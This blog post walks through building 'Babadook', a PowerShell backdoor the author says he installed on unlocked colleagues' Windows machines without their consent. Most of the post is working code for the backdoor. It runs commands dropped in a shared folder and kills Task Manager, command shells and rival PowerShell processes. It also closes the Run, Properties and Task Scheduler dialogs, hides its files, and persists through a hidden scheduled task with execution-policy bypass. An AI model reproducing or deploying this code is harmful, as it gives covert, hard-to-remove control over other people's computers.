---
title: 'Babadook: Connection-less Powershell Persistent and Resilient “Backdoor”'
author: Jan Seidl
type: post
date: 2015-09-23T14:13:55+00:00
url: /posts/babadook-connection-less-powershell-persistent-and-resilient-backdoor/
categories:
  - Malware
  - Penetration Testing
tags:
  - backdoor
  - malware
  - persistance
  - powershell
  - rootkit

---
At my previous company I used to prank the colleagues who left their stations unlocked. I call this my &#8220;internal awareness program&#8221;.

It was all fun and games at the beginning. I would leave post-its on their monitors with a friendly message _&#8220;You could&#8217;ve been hacked&#8221;_ but it wasn&#8217;t giving the expected results. Some colleagues found it funny and started &#8220;collecting&#8221; my post-its. There was a guy in particular with 5 of them. It was evident harder measures had to be taken.

I&#8217;ve escalated the awareness program by replacing post-its to emailing the whole team with the message _&#8220;I was reckless and left my computer unlocked&#8221;_. Everybody would laugh about it but still wasn&#8217;t giving the needed outcome: People locking their desktops when away from the station. 

<img src="https://wroot.org/wp/wp-content/uploads/2015/07/deeper.jpg" alt="" width="512" height="279" class="aligncenter size-full wp-image-54010" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/deeper.jpg 512w, https://wroot.org/wp/wp-content/uploads/2015/07/deeper-300x163.jpg 300w" sizes="(max-width: 512px) 100vw, 512px" />

## Overcoming restrictions

I came to the conclusion that my colleagues would only learn the lesson if in fact they got hacked somehow, so I decided to make a backdoor so I&#8217;d be able to mess with their machines remotely.

Turns out that we were in a fairly constrained environment:

  * No direct connections between machines: VLAN isolation
  * User-only access, no admin privileges, cannot install anything
  * Corporate anti-virus in use, cannot use off-the-shelf solutions

So I started thinking what could I do with what I had in hands. As we were using Windows 7, one powerful tool came to my mind: POWERSHELL. Aw yiss!

I still needed to overcome some situations, no direct connections, inability to open sockets and so on.

As we were all members of the same team, we had access to the some shared folders and that was the vector that popped my mind. I would place a script on this shared folder and my backdoor would read this script and kinda `eval()` it. Simple and effective.

{{< highlight powershell >}}
$SharePath = "\\ournas\ourteamfolder\somesubfolder"
$MyPID = $([System.Diagnostics.Process]::GetCurrentProcess()).Id
$Interval = 10
$CurrMachineCmdPath = "$($SharePath)\cmd.$($env:COMPUTERNAME).$($MyPID).ps1"

# ... some code

# Command parsing loop
While ($true) {
            
    If (Test-Path $CurrMachineCmdPath) {
        Try {
            & $CurrMachineCmdPath
            Clear-Content $CurrMachineCmdPath
        } Catch [system.exception] {
            Log "Error running script: $_"
        }# end :: try/catch
    }# end :: if

    Start-Sleep $Interval
}#end :: while
{{< /highlight >}}

So by using the shared folder strategy and using powershell I&#8217;d solve the isolation problem AND the antivirus problem at once. I&#8217;ve added `Clear-Content` so the script would only run the code once.

I&#8217;ve skipped lunch for a day and rigged a quick and dirty POC. Tested on my machine, found a colleague that had left the machine unlocked and BAM, it was working.

After some days of fun, they started figuring out and killing my powershell process from the task manager. I needed to make the backdoor resilient.

## Enter Babadook

The name came from an excellent scary movie (I trully recomend you to watch it!) I&#8217;d seen a while ago called <a href="http://www.imdb.com/title/tt2321549/" target="_blank">The Babadook @ IMDB</a>, which had the quote _&#8220;If it&#8217;s in a word or in a look, you can&#8217;t get rid of the Babadook&#8221;_. 

That&#8217;s the motto I would follow to my backdoor. Make it unkillable as long as reasonably possible. Stealthiness wasn&#8217;t a big deal. Once I&#8217;d started playing the _&#8220;Super Mario Theme Song&#8221;_ on their PC Speakers my presence would be spotted. 

I kinda also wanted them to know and after some while after they came back to their stations and realized they had left it unlocked, they knew they had been pranked.

<img src="https://wroot.org/wp/wp-content/uploads/2015/07/the-babadook.jpg" alt="The Babadook" width="687" height="444" class="aligncenter size-full wp-image-54017" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/the-babadook.jpg 687w, https://wroot.org/wp/wp-content/uploads/2015/07/the-babadook-300x194.jpg 300w" sizes="(max-width: 687px) 100vw, 687px" />

### Multi-threading and the Watchdog routine

I quickly concluded that I&#8217;d needed to make my backdoor multi-threaded to have something watching my back while the main routine was waiting for commands. Powershell&#8217;s &#8220;<a href="http://blogs.technet.com/b/heyscriptingguy/archive/2012/12/31/using-windows-powershell-jobs.aspx" target="_blank">Jobs</a>&#8221; functionality would fit. 

I&#8217;ve created a Watchdog function which were merely a `while ($True)` loop sending `Stop-Process -processname taskmgr` and ignoring errors (if the Task Manager wasn&#8217;t running). 

I did the same for `cmd.exe`, `wscript.exe` and `cscript.exe` just to be safe.

{{< highlight powershell >}}
Stop-Process -processname taskmgr -Force -ErrorAction SilentlyContinue Stop-Process -processname cmd -Force -ErrorAction SilentlyContinue Stop-Process -processname wscript -Force -ErrorAction SilentlyContinue Stop-Process -processname cscript -Force -ErrorAction SilentlyContinue {{< /highlight >}} 

This also effectively blocks running `.bat` and `.vbs` files since the interpreter has no chance to fully load before being killed by Babadook.

That worked for a while until IT released a <acronym title="Group Policy Objects">GPO</acronym> update blocking powershell remoting and thus blocking the use of powershell Jobs. \*sadface\*

So the quest for an alternative began and remembering how powershell and .NET integrate beautifully I was sure I could use some `Somelongnamespace.Threading.Something` .NET voodoo to accomplish that. Turned out the solution was way easier by using powershell&#8217;s <a href="http://thesurlyadmin.com/2013/02/11/multithreading-powershell-scripts/" target="_blank">Runspaces</a>. 

{{< highlight powershell >}}
$Watchdog = { # code here }

# "If it's in a word or in a look, you can't get rid of the babadook"
$Global:BabadookWatchdog = [PowerShell]::Create().AddScript($Watchdog)
$Global:WatchdogJob = $Global:BabadookWatchdog.BeginInvoke()

# ... code ...

# Stop Watchdog
If ($Global:BabadookWatchdog -And $Global:WatchdogJob) {
    Log "Stopping Babadook Watchdog"
	# No EndInvoke because we won't return (while true loop) and we don't care about the return anyway
    $Global:BabadookWatchdog.Dispose() | Out-Null
    Log "Watchdog disposed"
}# end :: if
{{< /highlight >}}

It worked as a charm! My watchdog was up again killing Task Manager immediatly as the window would (try) to appear. My colleagues were going crazy.

_NOTE: Up to this moment I&#8217;ve been facing some issues with `BeginInvoke` which seems to fail to run ever once in a while, still debugging this issue. With Jobs I&#8217;ve never had this issue, instead I had issues where when the Job wasn&#8217;t properly stopped, it would run forever and required a reboot to die since the Watchdog wouldn&#8217;t let me open a powershell session._

#### There can be only one

<img src="https://wroot.org/wp/wp-content/uploads/2015/07/original.jpg" alt="" width="350" height="241" class="aligncenter size-full wp-image-54026" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/original.jpg 350w, https://wroot.org/wp/wp-content/uploads/2015/07/original-300x207.jpg 300w" sizes="(max-width: 350px) 100vw, 350px" />

In order to ensure that nobody would try to play smart and open a powershell window and try to use the `Get-Process` and `Stop-Process` to try to kill my backdoor, I&#8217;ve added the functionality to the watchdog to kill all powershell processes which were not his own. Upon start I&#8217;d save my process ID into a variable and use that to check the other powershell processes. 

{{< highlight powershell >}}
Function Kill-PS {
    Stop-Process -processname powershell_ise -Force -ErrorAction SilentlyContinue # Kill powershell_ise.Exe
    # Kill powershell processes which are not me
    $AllPS = [array] $(Get-Process | Where-Object { $_.ProcessName -eq "powershell" -And $_.Id -ne "$MyPID" })
    If ($AllPS.Count -gt 0) {
    	ForEach ($Proc in $AllPS) { Stop-Process -Id $Proc.ID -Force -ErrorAction SilentlyContinue }# end :: foreach
    }# end :: if	
}# end :: Kill-PS
{{< /highlight >}}

Also, no Powershell ISE here!

#### You can&#8217;t Run but I can hide!

At the same time my colleagues were desperately trying to kill Babadook, I was also doing the same to ensure I could cover the holes before they were able to get to it.

I&#8217;ve realized that someone could just invoke the `taskill` command directly from the &#8220;Run&#8221; dialog and that was bad (for me), so I needed a way to prevent that dialog from coming up. As this is a built-in dialog and not a process, I wasn&#8217;t able to take down on the classical way (with `Stop-Process`) so I&#8217;ve appealed to .NET extensions to grab some Windows <acronym title="Application Programming Interface">API</acronym> calls in order to enumerate the foreground window and if the title was what I wanted, kaboom!.

{{< highlight powershell >}}
Add-Type  @" 
    using System;
    using System.Runtime.InteropServices; 
    using System.Text;
         
    public class APIFuncs
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hwnd,StringBuilder lpString, int cch);
        [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern Int32 GetWindowTextLength(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
                    
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_CLOSE = 0xF060;                
        }
"@

Function Kill-Run {
    $ForegroundWindow = [apifuncs]::GetForegroundWindow()
    $WindowTextLen = [apifuncs]::GetWindowTextLength($ForegroundWindow)
    $StringBuffer = New-Object text.stringbuilder -ArgumentList ($WindowTextLen + 1)
    $ReturnLen = [apifuncs]::GetWindowText($ForegroundWindow,$StringBuffer,$StringBuffer.Capacity)
    $WindowText = $StringBuffer.tostring()
    if ($WindowText -eq "Run") {
        [void][apifuncs]::SendMessage($ForegroundWindow, [apifuncs]::WM_SYSCOMMAND, [apifuncs]::SC_CLOSE, 0)
    }# end :: if
}# end :: Kill-Run
{{< /highlight >}}

##### Hiding in plain sight

To add a sleight of fear, I&#8217;d thought it would be nice to hide my Babadook files since if my victim could find the command script on the shared folder, he could add some code there to kill Babadook and end my party, so a little code to get this sorted out was added to the Watchdog:

{{< highlight powershell >}}
Function Hide-Me {
    If (Test-Path $ScriptPath) { $(Get-Item $ScriptPath -Force).Attributes = "Archive,Hidden" }
    If (Test-Path $CurrMachineCmdPath) { $(Get-Item $CurrMachineCmdPath -Force).Attributes = "Archive,Hidden" }
    If (Test-Path $LogPath) { $(Get-Item $LogPath -Force).Attributes = "Archive,Hidden" }
    Set-ItemProperty HKCU:\\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name Hidden -Value 2 # Don't display hidden files
}# end :: Hide-Me
{{< /highlight >}}

The last line adds an entry to the Registry turning on the option &#8220;Don&#8217;t display system and hidden files&#8221;. As this was on the `While ($true)` loop, even if the user turned that off, it would be turned back on immediately.

#### Take no shortcuts

With my anti-kill countermeasures in place, I was thinking on more ways to kill Babadook to improve the Watchdog, so it came to my mind that one could create a shortcut for `taskill` so I&#8217;ve made a little modification to my &#8220;Run Killer&#8221;:

{{< highlight powershell >}}
# ... some code

if ($WindowText -eq "Run" -Or $WindowText.Contains("Properties")) {
    [void][apifuncs]::SendMessage($ForegroundWindow, [apifuncs]::WM_SYSCOMMAND, [apifuncs]::SC_CLOSE, 0)
}# end :: if

# ... more code
{{< /highlight >}}

That would take care of popping out the &#8220;Properties&#8221; dialog out of any file. Booya!

### When everything else fails, reboot!

I&#8217;m sure there are some other ways to kill my process but that was enough for the moment (and I needed to get some lunch anyway). So people started realizing that a reboot was the only way to get rid of the Babadook. 

I couldn&#8217;t leave this that way and needed a a persistence method. I first thought about the &#8220;Run&#8221; key on the registry but that might need admin privileges, so why not resort to our well known scheduled tasks?

Popped up a code to copy the Babadook script to the local machine with a random name and create the new task to run &#8220;At Logon&#8221;, &#8220;On Idle&#8221; and &#8220;Daily at 8AM&#8221;.

{{< highlight powershell >}}
function Babadook-Persist
{
	$CharSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
	$NewName = $(Get-Random -InputObject $CharSet -Count 8 | % -Begin { $randStr = $null } -Process { $randStr += [char]$_ } -End { $randStr }) + ".ps1"
	$NewPath = "$($env:LOCALAPPDATA)\$($NewName)"
    
    Install-Task $NewPath
    
}# end :: Babadook-Persist

function Install-Task ($BBDPath) {
    $CommandArguments = "-executionpolicy bypass -windowstyle hidden -f `"$($BBDPath)`""
    $taskRunAsuser = [Environment]::UserDomainName +"\" + $env:USERNAME

    $service = new-object -com("Schedule.Service")
    $service.Connect()
    $rootFolder = $service.GetFolder("\")

    Try {

        $rootFolder.GetTask("\Babadook") | Out-Null
        Log "Babadook persist task already installed"
        
    } Catch {
	
		Log "Copying Babadook to local machine at `"$($BBDPath)`""
		Copy-Item $script:MyInvocation.MyCommand.Path $BBDPath -Force
        Log "Installing Babadook persist task"

        $taskDefinition = $service.NewTask(0)

        $regInfo = $taskDefinition.RegistrationInfo
        $regInfo.Description = 'Ba-ba-ba DOOK DOOK DOOK'
        $regInfo.Author = $taskRunAsuser

        $settings = $taskDefinition.Settings
        $settings.Enabled = $True
        $settings.StartWhenAvailable = $True
        $settings.Hidden = $True

        $triggers = $taskDefinition.Triggers

        # Triger time
        $triggerDaily = $triggers.Create(2)
        $triggerDaily.StartBoundary = "$(Get-Date -Format 'yyyy-mm-dd')T08:00:00"
        $triggerDaily.DaysInterval = 1
        $triggerDaily.Enabled = $True

        # Trigger logon
        $triggerLogon = $triggers.Create(9)
        $triggerLogon.UserId = $taskRunAsUser
        $triggerLogon.Enabled = $True

        # Trigger Idle
        $triggerIdle = $triggers.Create(6)
        $triggerIdle.Enabled = $True

        $Action = $taskDefinition.Actions.Create(0)
        $Action.Path = 'powershell.exe'
        $Action.Arguments = $CommandArguments

        $rootFolder.RegisterTaskDefinition( 'Babadook', $taskDefinition, 6, $null , $null, 3) | Out-Null
        
    }# end :: try/catch
}# End :: Install-Task
{{< /highlight >}}

_For more information on Task Scheduler options, check the [<acronym title="Microsoft Developer Network">MSDN</acronym> Technet documentation][1]._

That was working beautifully until I realized I needed some concurrency control. Of course my _&#8220;There can be only one&#8221;_ code would kill the competitors but I needed something more elegant and `Mutexes` came to my mind. Added a code for that also:

{{< highlight powershell >}}
# Wait for mutex
[bool]$MutexWasCreated = $false
$BabadookMutex = New-Object System.Threading.Mutex($true, $BabadookMutexName, [ref] $MutexWasCreated)
if (!$MutexWasCreated) { 
    Log "Babadook Mutex found, waiting release..."
    $BabadookMutex.WaitOne() | Out-Null
    Log "Babadook Mutex acquired"
} else {
    Log "Babadook Mutex installed"
}# end :: if

# ... code ...

# Release Mutex
Log "Releasing Babadook Mutex"
$BabadookMutex.ReleaseMutex(); 
$BabadookMutex.Close();
{{< /highlight >}}

And of course I needed to prevent them from opening the &#8220;Scheduled Tasks&#8221; dialog. Since a `Stop-Process` to the `mmc` process was giving me &#8220;Access Denied&#8221; (it runs in some kind of UAC), I needed to take the .NET approach. Modified my &#8220;IF&#8221; to consider that:

{{< highlight powershell >}}
if ($WindowText -eq "Run" -Or $WindowText.Contains("Properties") -Or $WindowText.Contains("Task Scheduler")) {
    [void][apifuncs]::SendMessage($ForegroundWindow, [apifuncs]::WM_SYSCOMMAND, [apifuncs]::SC_CLOSE, 0)
}# end :: if
{{< /highlight >}}

## Recap

So far we got:

  * Connection-less command execution (full powershell language incl. .NET extensions + system()-like with `Start-Process`)
  * Watchdog / Userkit (userland &#8220;root&#8221;kit)
  * Persistence
  * Concurrency control

And that worked well enough for me :)

## It&#8217;s not about the money

So if you read until here you might probably been wondering: &#8220;Did you really skipped those lunches just to mess up your colleagues?&#8221;

<img src="https://wroot.org/wp/wp-content/uploads/2015/07/62215135.jpg" alt="" width="400" height="400" class="aligncenter size-full wp-image-54036" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/62215135.jpg 400w, https://wroot.org/wp/wp-content/uploads/2015/07/62215135-150x150.jpg 150w, https://wroot.org/wp/wp-content/uploads/2015/07/62215135-300x300.jpg 300w" sizes="(max-width: 400px) 100vw, 400px" />

Well, kinda. It was a great learning and they surely got the message. No one now leaves their session unlocked. :)

<img src="https://wroot.org/wp/wp-content/uploads/2015/07/Anchorman-Im-not-even-mad.png" alt="" width="479" height="251" class="aligncenter size-full wp-image-54039" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/Anchorman-Im-not-even-mad.png 479w, https://wroot.org/wp/wp-content/uploads/2015/07/Anchorman-Im-not-even-mad-300x157.png 300w" sizes="(max-width: 479px) 100vw, 479px" />

When the news hit my team leader (how they called the Boss at the company) he saw this was a good way to show upper management and the other teams the dangers of an insider, how basic malware works and escalated the Babadook as a truly internal awareness program, so it turned out to be a great deal for everyone (except for a few really pissed off teammates).

## Code

As always, you can get the [Babadook source at my github][2].

 [1]: https://msdn.microsoft.com/en-us/library/windows/desktop/aa383607(v=vs.85).aspx
 [2]: https://github.com/jseidl/Babadook
